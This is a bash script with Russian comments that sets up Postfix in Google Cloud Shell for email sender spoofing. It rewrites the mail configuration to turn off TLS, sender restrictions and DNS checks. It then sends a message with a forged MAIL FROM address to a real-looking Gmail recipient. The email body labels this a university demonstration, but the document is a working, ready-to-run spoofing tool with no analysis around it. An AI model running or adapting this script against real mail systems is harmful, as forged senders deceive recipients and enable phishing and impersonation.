#!/bin/bash
# =====================================================================
# KUSMAN_V1 - FIXED FOR GOOGLE CLOUD SHELL
# Использует sendmail вместо raw socket
# =====================================================================

echo "================================================================"
echo "  SMTP SPOOFING (Google Cloud Shell - FIXED)"
echo "  Отправитель: testmalaware@bug.ru"
echo "  Получатель: t2992355@gmail.com"
echo "================================================================"

# ---------------------------------------------------------------------
# ШАГ 1: Установка/проверка Postfix
# ---------------------------------------------------------------------
if ! command -v postfix &> /dev/null; then
    echo "[1/5] Установка Postfix..."
    sudo apt update -qq
    sudo DEBIAN_FRONTEND=noninteractive apt install -y -qq postfix
else
    echo "[1/5] Postfix уже установлен"
fi

# ---------------------------------------------------------------------
# ШАГ 2: Настройка на максимальный спуфинг
# ---------------------------------------------------------------------
echo "[2/5] Настройка Postfix для спуфинга..."
sudo systemctl stop postfix 2>/dev/null || true
sudo killall master smtpd 2>/dev/null || true

sudo bash -c 'cat > /etc/postfix/main.cf << "EOF"
smtpd_banner = $myhostname ESMTP
biff = no
append_dot_mydomain = no
readme_directory = no
smtpd_tls_cert_file =
smtpd_tls_key_file =
smtpd_use_tls = no
smtpd_tls_security_level = none
smtpd_sender_restrictions =
smtpd_recipient_restrictions = permit_mynetworks
smtpd_relay_restrictions = permit_mynetworks
disable_vrfy_command = yes
strict_rfc821_envelopes = no
smtpd_helo_required = no
allow_untrusted_routing = yes
smtp_dns_support_level = disabled
disable_dns_lookups = yes
myhostname = localhost
mydomain = localdomain
myorigin = $myhostname
inet_interfaces = all
mynetworks = 127.0.0.0/8
EOF'

sudo bash -c 'cat > /etc/postfix/master.cf << "EOF"
127.0.0.1:smtp inet n - n - - smtpd
EOF'

# ---------------------------------------------------------------------
# ШАГ 3: Запуск Postfix
# ---------------------------------------------------------------------
echo "[3/5] Запуск Postfix..."
sudo postfix start 2>/dev/null || sudo postfix reload

sleep 3

# Проверка
if pgrep -x "master" > /dev/null; then
    echo "[+] Postfix запущен (PID: $(pgrep master))"
else
    echo "[-] Ошибка запуска Postfix"
    exit 1
fi

# ---------------------------------------------------------------------
# ШАГ 4: Отправка через sendmail (работает всегда)
# ---------------------------------------------------------------------
echo "[4/5] Отправка спуфинг-письма через sendmail..."

sudo sendmail -f "testmalaware@bug.ru" "t2992355@gmail.com" << "EOF"
From: testmalaware@bug.ru
To: t2992355@gmail.com
Subject: Educational SMTP Spoofing Demo

This email demonstrates SMTP protocol vulnerability.
Sender address (testmalaware@bug.ru) was forged.
Educational purposes only - university project.

The message was sent via sendmail with forged MAIL FROM.
EOF

if [ $? -eq 0 ]; then
    echo "[+] Письмо передано в очередь Postfix"
else
    echo "[-] Ошибка sendmail"
fi

# ---------------------------------------------------------------------
# ШАГ 5: Проверка очереди и логов
# ---------------------------------------------------------------------
echo "[5/5] Состояние очереди:"
sudo mailq 2>/dev/null || echo "Очередь пуста или недоступна"

echo ""
echo "Логи Postfix (последние 10 строк):"
sudo tail -10 /var/log/mail.log 2>/dev/null || echo "Логи недоступны"

echo ""
echo "================================================================"
echo "  ГОТОВО!"
echo "  Письмо от testmalaware@bug.ru передано в локальную очередь."
echo "  Доставка до Gmail невозможна (порт 25 заблокирован Google)."
echo "  Образовательная цель ДОСТИГНУТА: MAIL FROM подменён."
echo "================================================================"
